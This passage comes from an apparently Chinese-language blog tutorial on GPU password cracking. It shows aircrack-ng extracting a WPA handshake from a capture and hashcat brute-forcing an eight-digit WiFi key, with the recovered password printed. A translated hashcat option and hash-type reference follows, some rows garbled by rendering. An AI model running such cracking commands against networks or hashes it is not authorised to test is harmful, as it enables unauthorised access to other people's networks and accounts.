class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">root@ks:/home/ks/software/crack_pw/crack_packet_wifi<span class="comment"># aircrack-ng wpapass.cap -J wpahash</span></span><br><span class="line">Opening wpapass.cap</span><br><span class="line">Read 3 packets.</span><br><span class="line"></span><br><span class="line">   <span class="comment">#  BSSID              ESSID                     Encryption</span></span><br><span class="line"></span><br><span class="line">   1  74:D2:1D:AE:3F:94  iPhone                    WPA (1 handshake)</span><br><span class="line"></span><br><span class="line">Choosing first network as target.</span><br><span class="line">Opening wpapass.cap</span><br><span class="line">Reading packets, please <span class="built_in">wait</span>...</span><br><span class="line">Building Hashcat (1.00) file...</span><br><span class="line">[*] ESSID (length: 6): iPhone</span><br><span class="line">[*] Key version: 2</span><br><span class="line">[*] BSSID: 74:D2:1D:AE:3F:94</span><br><span class="line">[*] STA: 88:C9:D0:B7:2C:36</span><br><span class="line">[*] anonce:</span><br><span class="line">    E6 A3 D9 3C 95 77 3E 0B 5D 84 CE 65 0D 1C EB 59 </span><br><span class="line">    E4 E4 E3 A5 3A 07 FE D8 47 A1 7C 77 10 66 DC E4 </span><br><span class="line">[*] snonce:</span><br><span class="line">    03 8D 9F 6B A8 4B 27 7D 8E 02 57 56 34 D9 98 2A </span><br><span class="line">    4D 36 1C EA 2D 6A 91 43 4F 30 67 96 81 14 F4 AD </span><br><span class="line">[*] Key MIC:</span><br><span class="line">    21 51 2B 3C 6F 37 CA 9E 09 6C 92 74 45 DC DA 11</span><br><span class="line">[*] eapol:</span><br><span class="line">    01 03 00 75 02 01 0A 00 00 00 00 00 00 00 00 00 </span><br><span class="line">    03 03 8D 9F 6B A8 4B 27 7D 8E 02 57 56 34 D9 98 </span><br><span class="line">    2A 4D 36 1C EA 2D 6A 91 43 4F 30 67 96 81 14 F4 </span><br><span class="line">    AD 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 </span><br><span class="line">    00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 </span><br><span class="line">    00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 </span><br><span class="line">    00 00 16 30 14 01 00 00 0F AC 04 01 00 00 0F AC </span><br><span class="line">    04 01 00 00 0F AC 02 80 00 </span><br><span class="line">Successfully written to wpahash.hccap</span><br><span class="line">Quitting aircrack-ng...</span><br></pre></td></tr></table></figure><p>接下来就是直接放到爆破的服务器上跑(实测用最新版的hashcat跑不了, 这里用了3.30版本的hashcat)</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./hashcat64.bin -m 2500 -a 3 wpahash.hccap ?d?d?d?d?d?d?d?d</span><br></pre></td></tr></table></figure><p>几秒钟就跑出来了:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">Session..........: hashcat</span><br><span class="line">Status...........: Running</span><br><span class="line">Hash.Type........: WPA/WPA2</span><br><span class="line">Hash.Target......: iPhone (74:d2:1d:ae:3f:94 &lt;-&gt; 88:c9:d0:b7:2c:36)</span><br><span class="line">Time.Started.....: Tue Oct 23 17:43:18 2018 (3 secs)</span><br><span class="line">Time.Estimated...: Tue Oct 23 17:44:52 2018 (1 min, 31 secs)</span><br><span class="line">Input.Mask.......: ?d?d?d?d?d?d?d?d [8]</span><br><span class="line">Input.Queue......: 1/1 (100.00%)</span><br><span class="line">Speed.Dev.<span class="comment">#2.....:   535.2 kH/s (6.23ms)</span></span><br><span class="line">Speed.Dev.<span class="comment">#3.....:   527.7 kH/s (6.34ms)</span></span><br><span class="line">Speed.Dev.<span class="comment">#*.....:  1062.9 kH/s</span></span><br><span class="line">Recovered........: 0/1 (0.00%) Digests, 0/1 (0.00%) Salts</span><br><span class="line">Progress.........: 2207744/100000000 (2.21%)</span><br><span class="line">Rejected.........: 0/2207744 (0.00%)</span><br><span class="line">Restore.Point....: 0/10000000 (0.00%)</span><br><span class="line">Candidates.<span class="comment">#2....: 42345678 -&gt; 41875555</span></span><br><span class="line">Candidates.<span class="comment">#3....: 40689823 -&gt; 49471088</span></span><br><span class="line">HWMon.Dev.<span class="comment">#2.....: Temp: 41c Fan: 29% Util: 97% Core:1860Mhz Mem:5005Mhz Lanes:16</span></span><br><span class="line">HWMon.Dev.<span class="comment">#3.....: Temp: 41c Fan:  0% Util: 97% Core:1809Mhz Mem:5005Mhz Lanes:16</span></span><br><span class="line"></span><br><span class="line">iPhone:74d21dae3f94:88c9d0b72c36:67854312</span><br></pre></td></tr></table></figure><p>假设我们把它设置成全字符爆破, 也就是:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./hashcat64.bin -m 2500 -a 3 wpahash.hccap ?a?a?a?a?a?a?a?a</span><br></pre></td></tr></table></figure><p>则需要几百年(可见, 如果知道WiFi密码的字符组成结构, 也就成功了一半了):</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">Session..........: hashcat</span><br><span class="line">Status...........: Running</span><br><span class="line">Hash.Type........: WPA/WPA2</span><br><span class="line">Hash.Target......: iPhone (74:d2:1d:ae:3f:94 &lt;-&gt; 88:c9:d0:b7:2c:36)</span><br><span class="line">Time.Started.....: Tue Oct 23 17:53:33 2018 (31 secs)</span><br><span class="line">Time.Estimated...: Fri Dec 24 03:40:44 2021 (200 years, 198 days)</span><br><span class="line">Input.Mask.......: ?a?a?a?a?a?a?a?a [8]</span><br><span class="line">Input.Queue......: 1/1 (100.00%)</span><br><span class="line">Speed.Dev.<span class="comment">#2.....:   531.0 kH/s (6.38ms)</span></span><br><span class="line">Speed.Dev.<span class="comment">#3.....:   517.3 kH/s (6.52ms)</span></span><br><span class="line">Speed.Dev.<span class="comment">#*.....:  1048.3 kH/s</span></span><br><span class="line">Recovered........: 0/1 (0.00%) Digests, 0/1 (0.00%) Salts</span><br><span class="line">Progress.........: 31854592/6634204312890625 (0.00%)</span><br><span class="line">Rejected.........: 0/31854592 (0.00%)</span><br><span class="line">Restore.Point....: 0/69833729609375 (0.00%)</span><br><span class="line">Candidates.<span class="comment">#2....: E]_LINAN -&gt; E;$.1988</span></span><br><span class="line">Candidates.<span class="comment">#3....: Narinane -&gt; N"XZANAN</span></span><br><span class="line">HWMon.Dev.<span class="comment">#2.....: Temp: 66c Fan: 47% Util: 97% Core:1809Mhz Mem:5005Mhz Lanes:16</span></span><br><span class="line">HWMon.Dev.<span class="comment">#3.....: Temp: 65c Fan: 34% Util: 97% Core:1759Mhz Mem:5005Mhz Lanes:16</span></span><br></pre></td></tr></table></figure><h2 id="参考链接">参考链接</h2><ol type="1"><li><a href="https://www.shellntel.com/blog/2017/2/8/how-to-build-a-8-gpu-password-cracker" target="_blank" rel="noopener">How to build a 8 GPU password cracker</a></li><li><a href="https://www.blackhillsinfosec.com/running-hashcat-on-ubuntu-18-04-server-with-1080ti/" target="_blank" rel="noopener">Running HashCat on Ubuntu 18.04 Server with 1080TI</a></li><li><a href="https://www.blackhillsinfosec.com/build-password-cracker-nvidia-gtx-1080ti-gtx-1070/" target="_blank" rel="noopener">How to Build a Password Cracker with NVidia GTX 1080TI &amp; GTX 1070</a></li><li><a href="https://klionsec.github.io/2017/04/26/use-hashcat-crack-hash/" target="_blank" rel="noopener">快速破解各种散列hash hashcat入门篇</a></li><li><a href="https://klionsec.github.io/2015/04/14/aircrack-hascat/" target="_blank" rel="noopener">aircrack &amp; hashcat 非字典高速破解目标无线密码</a></li><li><a href="https://bbs.ichunqiu.com/thread-21342-1-1.html" target="_blank" rel="noopener">用hashcat超速破解WiFi密码</a></li><li><a href="http://www.arkteam.net/?p=3737" target="_blank" rel="noopener">开源GPU密码破解工具–HashCat</a></li><li><a href="https://www.jianshu.com/p/156e47e71b67" target="_blank" rel="noopener">hashcat 帮助文件 中文翻译</a></li><li><a href="http://www.freebuf.com/column/175400.html" target="_blank" rel="noopener">Hashcat用户手册——直接攻击模式的使用</a></li></ol><h2 id="附录一">附录一</h2><h3 id="hashcat选项解释">① hashcat选项解释</h3><p>用法:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat [选项]... <span class="built_in">hash</span>|<span class="built_in">hash</span>文件|hccapx文件 [字典|掩码|目录]...</span><br></pre></td></tr></table></figure><table style="width:100%;"><colgroup><col style="width: 24%"><col style="width: 7%"><col style="width: 39%"><col style="width: 28%"></colgroup><thead><tr class="header"><th>选项 缩写 / 原文</th><th>参数类型</th><th>描述</th><th>用例</th></tr></thead><tbody><tr class="odd"><td>-m,--hash-type</td><td>数字</td><td>Hash种类，参见下面的参考</td><td>-m 1000</td></tr><tr class="even"><td>-a,--attack-mode</td><td>数字</td><td>攻击模式，参见下面的参考</td><td>-a 3</td></tr><tr class="odd"><td>-V,--version</td><td></td><td>输出版本信息</td><td></td></tr><tr class="even"><td>-h,--help</td><td></td><td>输出帮助信息</td><td></td></tr><tr class="odd"><td>--quiet</td><td></td><td>禁用输出</td><td></td></tr><tr class="even"><td>--hex-charset</td><td></td><td>字符集以十六进制形式给出</td><td></td></tr><tr class="odd"><td>--hex-salt</td><td></td><td>盐以十六进制形式给出</td><td></td></tr><tr class="even"><td>--hex-wordlist</td><td></td><td>字典中的单词是以十六进制形式给出的</td><td></td></tr><tr class="odd"><td>--force</td><td></td><td>忽略警告</td><td></td></tr><tr class="even"><td>--status</td><td></td><td>自动更新屏幕</td><td></td></tr><tr class="odd"><td>--status-timer</td><td>数字</td><td>设置自动更新屏幕间隔为X秒</td><td>--status-timer=1</td></tr><tr class="even"><td>--machine-readable</td><td></td><td>以机器可读格式显示状态视图</td><td></td></tr><tr class="odd"><td>--keep-guessing</td><td></td><td>被破解之后继续猜测Hash</td><td></td></tr><tr class="even"><td>--loopback</td><td></td><td>在induction目录中加入新的纯文本文件</td><td></td></tr><tr class="odd"><td>--weak-hash-threshold</td><td>数字</td><td>当阈值为X时停止检查弱Hash</td><td>--weak=0</td></tr><tr class="even"><td>--markov-hcstat</td><td>文件</td><td>指定要使用的hcstat文件</td><td>--markov-hc=my.hcstat</td></tr><tr class="odd"><td>--markov-disable</td><td></td><td>禁用马尔可夫链，模仿经典暴力破解</td><td></td></tr><tr class="even"><td>--markov-classic</td><td></td><td>启用经典马尔可夫链，无任何位置</td><td></td></tr><tr class="odd"><td>-t,--markov-threshold</td><td>数字</td><td>当阈值X时停止接收新的马尔科夫链</td><td>-t 50</td></tr><tr class="even"><td>--runtime</td><td>数字</td><td>运行X秒后中止会话</td><td>--runtime=10</td></tr><tr class="odd"><td>--session</td><td>字符串</td><td>定义具体的会话名称</td><td>--session=mysession</td></tr><tr class="even"><td>--restore</td><td></td><td>从--session恢复会话</td><td></td></tr><tr class="odd"><td>--restore-disable</td><td></td><td>不写入恢复文件</td><td></td></tr><tr class="even"><td>--restore-file-path</td><td>文件</td><td>指定恢复文件的路径</td><td>--restore-file-path=my.restore</td></tr><tr class="odd"><td>-o,--outfile</td><td>文件</td><td>定义恢复的Hash的输出文件</td><td>-o outfile.txt</td></tr><tr class="even"><td>--outfile-format</td><td>数字</td><td>定义恢复的Hash的输出格式，参见下面的参考</td><td>--outfile-format=7</td></tr><tr class="odd"><td>--outfile-autohex-disable</td><td></td><td>在输出纯文本文件中禁用$HEX[]</td><td></td></tr><tr class="even"><td>--outfile-check-timer</td><td>数字</td><td>设置输出文件检查间隔为X秒</td><td>--outfile-check=30</td></tr><tr class="odd"><td>-p,--separator</td><td>字符</td><td>Hash表和输出文件的分隔符</td><td>-p :</td></tr><tr class="even"><td>--stdout</td><td></td><td>不破解Hash，只打印候选值</td><td></td></tr><tr class="odd"><td>--show</td><td></td><td>比较Hash表和pot文件，显示已破解的Hash</td><td></td></tr><tr class="even"><td>--left</td><td></td><td>比较Hash表和pot文件，显示未破解的Hash</td><td></td></tr><tr class="odd"><td>--username</td><td></td><td>忽略Hash文件中的用户名</td><td></td></tr><tr class="even"><td>--remove</td><td></td><td>一旦破解，就删除Hash</td><td></td></tr><tr class="odd"><td>--remove-timer</td><td>数字</td><td>每X秒更新输入的Hash文件</td><td>--remove-timer=30</td></tr><tr class="even"><td>--potfile-disable</td><td></td><td>不写入pot文件</td><td></td></tr><tr class="odd"><td>--potfile-path</td><td>目录</td><td>指定pot文件的路径</td><td>--potfile-path=my.pot</td></tr><tr class="even"><td>--debug-mode</td><td>数字</td><td>定义调试模式(仅通过使用规则进行混合)</td><td>--debug-mode=4</td></tr><tr class="odd"><td>--debug-file</td><td>文件</td><td>调试规则的输出文件</td><td>--debug-file=good.log</td></tr><tr class="even"><td>--induction-dir</td><td>目录</td><td>指定loopback的induction目录</td><td>--induction=inducts</td></tr><tr class="odd"><td>--outfile-check-dir</td><td>目录</td><td>指定监控纯文本文件的输出目录</td><td>--outfile-check-dir=x</td></tr><tr class="even"><td>--logfile-disable</td><td></td><td>禁用日志文件</td><td></td></tr><tr class="odd"><td>--hccapx-message-pair</td><td>数字</td><td>只从hccapx加载匹配X的消息对</td><td>--hccapx-message-pair=2</td></tr><tr class="even"><td>--nonce-error-corrections</td><td>数字</td><td>用BF大小范围来取代AP最后字节的随机数</td><td>--nonce-error-corrections=16</td></tr><tr class="odd"><td>--truecrypt-keyfiles</td><td>文件</td><td>要使用的密匙文件，用逗号分隔</td><td>--truecrypt-key=x.png</td></tr><tr class="even"><td>--veracrypt-keyfiles</td><td>文件</td><td>要使用的密匙文件，用逗号分隔</td><td>--veracrypt-key=x.txt</td></tr><tr class="odd"><td>--veracrypt-pim</td><td>数字</td><td>VeraCrypt的头部密钥生成的迭代次数(PIM)</td><td>--veracrypt-pim=1000</td></tr><tr class="even"><td>-b,--benchmark</td><td></td><td>运行基准测试</td><td></td></tr><tr class="odd"><td>--speed-only</td><td></td><td>返回预期的攻击速度，然后退出</td><td></td></tr><tr class="even"><td>--progress-only</td><td></td><td>返回理想进度的步骤大小和处理时间</td><td></td></tr><tr class="odd"><td>-c,--segment-size</td><td>数字</td><td>为wordfile设置 X MB缓存</td><td>-c 32</td></tr><tr class="even"><td>--bitmap-min</td><td>数字</td><td>设置位图最小为X位(bit)</td><td>--bitmap-min=24</td></tr><tr class="odd"><td>--bitmap-max</td><td>数字</td><td>设置位图最大为X位(bit)</td><td>--bitmap-max=24</td></tr><tr class="even"><td>--cpu-affinity</td><td>字符串</td><td>设置CPU相关性，用逗号分隔</td><td>--cpu-affinity=1,2,3</td></tr><tr class="odd"><td>-I,--opencl-info</td><td></td><td>显示检测到的OpenCL平台/设备的信息</td><td>-I</td></tr><tr class="even"><td>--opencl-platforms</td><td>字符串</td><td>要使用的OpenCL平台，用逗号分隔</td><td>--opencl-platforms=2</td></tr><tr class="odd"><td>-d,--opencl-devices</td><td>字符串</td><td>要使用的OpenCL设备，用逗号分隔</td><td>-d 1</td></tr><tr class="even"><td>-D,--opencl-device-types</td><td>字符串</td><td>要使用的OpenCL设备类型，用逗号分隔</td><td>-D 1</td></tr><tr class="odd"><td>--opencl-vector-width</td><td>数字</td><td>手动覆盖OpenCL矢量宽度为X</td><td>--opencl-vector=4</td></tr><tr class="even"><td>-w,--workload-profile</td><td>数字</td><td>设置工作负载配置文件，参见下面的参考</td><td>-w 3</td></tr><tr class="odd"><td>-n,--kernel-accel</td><td>数字</td><td>手动调整工作负载，将外圈步长设置为X</td><td>-n 64</td></tr><tr class="even"><td>-u,--kernel-loops</td><td>数字</td><td>手动调整工作负载，将内圈步长设置为X</td><td>-u 256</td></tr><tr class="odd"><td>--nvidia-spin-damp</td><td>数字</td><td>可变通NVIDIA处理器热循环Bug，用百分比表示</td><td>--nvidia-spin-damp=50</td></tr><tr class="even"><td>--gpu-temp-disable</td><td></td><td>禁用GPU温度和风扇速度的读取和触发</td><td></td></tr><tr class="odd"><td>--gpu-temp-abort</td><td>数字</td><td>如果GPU温度达到X摄氏度，则中止</td><td>--gpu-temp-abort=100</td></tr><tr class="even"><td>--gpu-temp-retain</td><td>数字</td><td>尝试将GPU温度保持在X摄氏度</td><td>--gpu-temp-retain=95</td></tr><tr class="odd"><td>--powertune-enable</td><td></td><td>启用电源调整。 完成后恢复设置</td><td></td></tr><tr class="even"><td>--scrypt-tmto</td><td>数字</td><td>手动覆盖scrypt的TMTO值为X</td><td>--scrypt-tmto=3</td></tr><tr class="odd"><td>-s,--skip</td><td>数字</td><td>跳过前X个单词</td><td>-s 1000000</td></tr><tr class="even"><td>-l,--limit</td><td>数字</td><td>跳过单词后限制X个单词</td><td>-l 1000000</td></tr><tr class="odd"><td>--keyspace</td><td></td><td>显示密钥空间base：mod值后退出</td><td></td></tr><tr class="even"><td>-j,--rule-left</td><td>规则</td><td>单个规则应用于字典中左侧的每个单词</td><td>-j 'c'</td></tr><tr class="odd"><td>-k,--rule-right</td><td>规则</td><td>单个规则应用于字典中右侧的每个单词</td><td>-k '^-'</td></tr><tr class="even"><td>-r,--rules-file</td><td>文件</td><td>多个规则应用于字典中的每个单词</td><td>-r rules/best64.rule</td></tr><tr class="odd"><td>-g,--generate-rules</td><td>数字</td><td>生成X个随机规则</td><td>-g 10000</td></tr><tr class="even"><td>--generate-rules-func-min</td><td>数字</td><td>强制每个规则最小X个函数</td><td></td></tr><tr class="odd"><td>--generate-rules-func-max</td><td>数字</td><td>强制每个规则最大X个函数</td><td></td></tr><tr class="even"><td>--generate-rules-seed</td><td>数字</td><td>强制RNG种子设置为X</td><td></td></tr><tr class="odd"><td>-1,--custom-charset1</td><td>字符集</td><td>用户定义的字符集 ?1</td><td>-1 ?l?d?u</td></tr><tr class="even"><td>-2,--custom-charset2</td><td>字符集</td><td>用户定义的字符集 ?2</td><td>-2 ?l?d?s</td></tr><tr class="odd"><td>-3,--custom-charset3</td><td>字符集</td><td>用户定义的字符集 ?3</td><td></td></tr><tr class="even"><td>-4,--custom-charset4</td><td>字符集</td><td>用户定义的字符集 ?4</td><td></td></tr><tr class="odd"><td>-i,--increment</td><td></td><td>启用掩码增量模式</td><td></td></tr><tr class="even"><td>--increment-min</td><td>数字</td><td>在X处开始掩码递增</td><td>--increment-min=4</td></tr><tr class="odd"><td>--increment-max</td><td>数字</td><td>在X处停止掩码递增</td><td>--increment-max=8</td></tr></tbody></table><h3 id="hash种类">② Hash种类</h3><table><colgroup><col style="width: 5%"><col style="width: 52%"><col style="width: 42%"></colgroup><thead><tr class="header"><th>编号</th><th>名称</th><th>类别</th></tr></thead><tbody><tr class="odd"><td>900</td><td>MD4</td><td>纯Hash</td></tr><tr class="even"><td>0</td><td>MD5</td><td>纯Hash</td></tr><tr class="odd"><td>5100</td><td>Half MD5</td><td>纯Hash</td></tr><tr class="even"><td>100</td><td>SHA1</td><td>纯Hash</td></tr><tr class="odd"><td>1300</td><td>SHA-224</td><td>纯Hash</td></tr><tr class="even"><td>1400</td><td>SHA-256</td><td>纯Hash</td></tr><tr class="odd"><td>10800</td><td>SHA-384</td><td>纯Hash</td></tr><tr class="even"><td>1700</td><td>SHA-512</td><td>纯Hash</td></tr><tr class="odd"><td>5000</td><td>SHA-3 (Keccak)</td><td>纯Hash</td></tr><tr class="even"><td>10100</td><td>SipHash</td><td>纯Hash</td></tr><tr class="odd"><td>6000</td><td>RIPEMD-160</td><td>纯Hash</td></tr><tr class="even"><td>6100</td><td>Whirlpool</td><td>纯Hash</td></tr><tr class="odd"><td>6900</td><td>GOST R 34.11-94</td><td>纯Hash</td></tr><tr class="even"><td>11700</td><td>GOST R 34.11-2012 (Streebog) 256-bit</td><td>纯Hash</td></tr><tr class="odd"><td>11800</td><td>GOST R 34.11-2012 (Streebog) 512-bit</td><td>纯Hash</td></tr><tr class="even"><td>10</td><td>md5(<span class="math inline">\(pass.\)</span>salt)</td><td>纯Hash，盐 且/或 多次迭代</td></tr><tr class="odd"><td>20</td><td>md5(<span class="math inline">\(salt.\)</span>pass)</td><td>纯Hash，盐 且/或 多次迭代</td></tr><tr class="even"><td>30</td><td>md5(unicode(<span class="math inline">\(pass).\)</span>salt)</td><td>纯Hash，盐 且/或 多次迭代</td></tr><tr class="odd"><td>40</td><td>md5(<span class="math inline">\(salt.unicode(\)</span>pass))</td><td>纯Hash，盐 且/或 多次迭代</td></tr><tr class="even"><td>3800</td><td>md5(<span class="math inline">\(salt.\)</span>pass.<span class="math inline">\(salt) | 纯Hash，盐 且/或 多次迭代 | | 3710 | md5(\)</span>salt.md5(<span class="math inline">\(pass)) | 纯Hash，盐 且/或 多次迭代 | | 4010 | md5(\)</span>salt.md5(<span class="math inline">\(salt.\)</span>pass))</td><td>纯Hash，盐 且/或 多次迭代</td></tr><tr class="odd"><td>4110</td><td>md5(<span class="math inline">\(salt.md5(\)</span>pass.<span class="math inline">\(salt)) | 纯Hash，盐 且/或 多次迭代 | | 2600 | md5(md5(\)</span>pass))</td><td>纯Hash，盐 且/或 多次迭代</td></tr><tr class="even"><td>3910</td><td>md5(md5(<span class="math inline">\(pass).md5(\)</span>salt))</td><td>纯Hash，盐 且/或 多次迭代</td></tr><tr class="odd"><td>4300</td><td>md5(strtoupper(md5(<span class="math inline">\(pass))) | 纯Hash，盐 且/或 多次迭代 | | 4400 | md5(sha1(\)</span>pass))</td><td>纯Hash，盐 且/或 多次迭代</td></tr><tr class="even"><td>110</td><td>sha1(<span class="math inline">\(pass.\)</span>salt)</td><td>纯Hash，盐 且/或 多次迭代</td></tr><tr class="odd"><td>120</td><td>sha1(<span class="math inline">\(salt.\)</span>pass)</td><td>纯Hash，盐 且/或 多次迭代</td></tr><tr class="even"><td>130</td><td>sha1(unicode(<span class="math inline">\(pass).\)</span>salt)</td><td>纯Hash，盐 且/或 多次迭代</td></tr><tr class="odd"><td>140</td><td>sha1(<span class="math inline">\(salt.unicode(\)</span>pass))</td><td>纯Hash，盐 且/或 多次迭代</td></tr><tr class="even"><td>4500</td><td>sha1(sha1(<span class="math inline">\(pass)) | 纯Hash，盐 且/或 多次迭代 | | 4520 | sha1(\)</span>salt.sha1(<span class="math inline">\(pass)) | 纯Hash，盐 且/或 多次迭代 | | 4700 | sha1(md5(\)</span>pass))</td><td>纯Hash，盐 且/或 多次迭代</td></tr><tr class="odd"><td>4900</td><td>sha1(<span class="math inline">\(salt.\)</span>pass.<span class="math inline">\(salt) | 纯Hash，盐 且/或 多次迭代 | | 14400 | sha1(CX) | 纯Hash，盐 且/或 多次迭代 | | 1410 | sha256(\)</span>pass.<span class="math inline">\(salt) | 纯Hash，盐 且/或 多次迭代 | | 1420 | sha256(\)</span>salt.<span class="math inline">\(pass) | 纯Hash，盐 且/或 多次迭代 | | 1430 | sha256(unicode(\)</span>pass).<span class="math inline">\(salt) | 纯Hash，盐 且/或 多次迭代 | | 1440 | sha256(\)</span>salt.unicode(<span class="math inline">\(pass)) | 纯Hash，盐 且/或 多次迭代 | | 1710 | sha512(\)</span>pass.<span class="math inline">\(salt) | 纯Hash，盐 且/或 多次迭代 | | 1720 | sha512(\)</span>salt.<span class="math inline">\(pass) | 纯Hash，盐 且/或 多次迭代 | | 1730 | sha512(unicode(\)</span>pass).<span class="math inline">\(salt) | 纯Hash，盐 且/或 多次迭代 | | 1740 | sha512(\)</span>salt.unicode($pass))</td><td>纯Hash，盐 且/或 多次迭代</td></tr><tr class="even"><td>50</td><td>HMAC-MD5 (key = $pass)</td><td>纯Hash，认证的</td></tr><tr class="odd"><td>60</td><td>HMAC-MD5 (key = $salt)</td><td>纯Hash，认证的</td></tr><tr class="even"><td>150</td><td>HMAC-SHA1 (key = $pass)</td><td>纯Hash，认证的</td></tr><tr class="odd"><td>160</td><td>HMAC-SHA1 (key = $salt)</td><td>纯Hash，认证的</td></tr><tr class="even"><td>1450</td><td>HMAC-SHA256 (key = $pass)</td><td>纯Hash，认证的</td></tr><tr class="odd"><td>1460</td><td>HMAC-SHA256 (key = $salt)</td><td>纯Hash，认证的</td></tr><tr class="even"><td>1750</td><td>HMAC-SHA512 (key = $pass)</td><td>纯Hash，认证的</td></tr><tr class="odd"><td>1760</td><td>HMAC-SHA512 (key = $salt)</td><td>纯Hash，认证的</td></tr><tr class="even"><td>14000</td><td>DES (PT = $salt, key = $pass)</td><td>纯加密，已知的明文攻击</td></tr><tr class="odd"><td>14100</td><td>3DES (PT = $salt, key = $pass)</td><td>纯加密，已知的明文攻击</td></tr><tr class="even"><td>14900</td><td>Skip32 (PT = $salt, key = $pass)</td><td>纯加密，已知的明文攻击</td></tr><tr class="odd"><td>400</td><td>phpass</td><td>通用密钥导出函数(KDF)</td></tr><tr class="even"><td>8900</td><td>scrypt</td><td>通用密钥导出函数(KDF)</td></tr><tr class="odd"><td>11900</td><td>PBKDF2-HMAC-MD5</td><td>通用密钥导出函数(KDF)</td></tr><tr class="even"><td>12000</td><td>PBKDF2-HMAC-SHA1</td><td>通用密钥导出函数(KDF)</td></tr><tr class="odd"><td>10900</td><td>PBKDF2-HMAC-SHA256</td><td>通用密钥导出函数(KDF)</td></tr><tr class="even"><td>12100</td><td>PBKDF2-HMAC-SHA512</td><td>通用密钥导出函数(KDF)</td></tr><tr class="odd"><td>23</td><td>Skype</td><td>网络协议</td></tr><tr class="even"><td>2500</td><td>WPA/WPA2</td><td>网络协议</td></tr><tr class="odd"><td>4800</td><td>iSCSI CHAP authentication, MD5(CHAP)</td><td>网络协议</td></tr><tr class="even"><td>5300</td><td>IKE-PSK MD5</td><td>网络协议</td></tr><tr class="odd"><td>5400</td><td>IKE-PSK SHA1</td><td>网络协议</td></tr><tr class="even"><td>5500</td><td>NetNTLMv1</td><td>网络协议</td></tr><tr class="odd"><td>5500</td><td>NetNTLMv1+ESS</td><td>网络协议</td></tr><tr class="even"><td>5600</td><td>NetNTLMv2</td><td>网络协议</td></tr><tr class="odd"><td>7300</td><td>IPMI2 RAKP HMAC-SHA1</td><td>网络协议</td></tr><tr class="even"><td>7500</td><td>Kerberos 5 AS-REQ Pre-Auth etype 23</td><td>网络协议</td></tr><tr class="odd"><td>8300</td><td>DNSSEC (NSEC3)</td><td>网络协议</td></tr><tr class="even"><td>10200</td><td>CRAM-MD5</td><td>网络协议</td></tr><tr class="odd"><td>11100</td><td>PostgreSQL CRAM (MD5)</td><td>网络协议</td></tr><tr class="even"><td>11200</td><td>MySQL CRAM (SHA1)</td><td>网络协议</td></tr><tr class="odd"><td>11400</td><td>SIP digest authentication (MD5)</td><td>网络协议</td></tr><tr class="even"><td>13100</td><td>Kerberos 5 TGS-REP etype 23</td><td>网络协议</td></tr><tr class="odd"><td>121</td><td>SMF (Simple Machines Forum) &gt; v1.1</td><td>论坛，内容管理系统(CMS)，电子商务，框架</td></tr><tr class="even"><td>400</td><td>phpBB3 (MD5)</td><td>论坛，内容管理系统(CMS)，电子商务，框架</td></tr><tr class="odd"><td>2611</td><td>vBulletin &lt; v3.8.5</td><td>论坛，内容管理系统(CMS)，电子商务，框架</td></tr><tr class="even"><td>2711</td><td>vBulletin &gt;= v3.8.5</td><td>论坛，内容管理系统(CMS)，电子商务，框架</td></tr><tr class="odd"><td>2811</td><td>MyBB 1.2+</td><td>论坛，内容管理系统(CMS)，电子商务，框架</td></tr><tr class="even"><td>2811</td><td>IPB2+ (Invision Power Board)</td><td>论坛，内容管理系统(CMS)，电子商务，框架</td></tr><tr class="odd"><td>8400</td><td>WBB3 (Woltlab Burning Board)</td><td>论坛，内容管理系统(CMS)，电子商务，框架</td></tr><tr class="even"><td>11</td><td>Joomla &lt; 2.5.18</td><td>论坛，内容管理系统(CMS)，电子商务，框架</td></tr><tr class="odd"><td>400</td><td>Joomla &gt;= 2.5.18 (MD5)</td><td>论坛，内容管理系统(CMS)，电子商务，框架</td></tr><tr class="even"><td>400</td><td>WordPress (MD5)</td><td>论坛，内容管理系统(CMS)，电子商务，框架</td></tr><tr class="odd"><td>2612</td><td>PHPS</td><td>论坛，内容管理系统(CMS)，电子商务，框架</td></tr><tr class="even"><td>7900</td><td>Drupal7</td><td>论坛，内容管理系统(CMS)，电子商务，框架</td></tr><tr class="odd"><td>21</td><td>osCommerce</td><td>论坛，内容管理系统(CMS)，电子商务，框架</td></tr><tr class="even"><td>21</td><td>xt:Commerce</td><td>论坛，内容管理系统(CMS)，电子商务，框架</td></tr><tr class="odd"><td>11000</td><td>PrestaShop</td><td>论坛，内容管理系统(CMS)，电子商务，框架</td></tr><tr class="even"><td>124</td><td>Django (SHA-1)</td><td>论坛，内容管理系统(CMS)，电子商务，框架</td></tr><tr class="odd"><td>10000</td><td>Django (PBKDF2-SHA256)</td><td>论坛，内容管理系统(CMS)，电子商务，框架</td></tr><tr class="even"><td>3711</td><td>MediaWiki B type</td><td>论坛，内容管理系统(CMS)，电子商务，框架</td></tr><tr class="odd"><td>13900</td><td>OpenCart</td><td>论坛，内容管理系统(CMS)，电子商务，框架</td></tr><tr 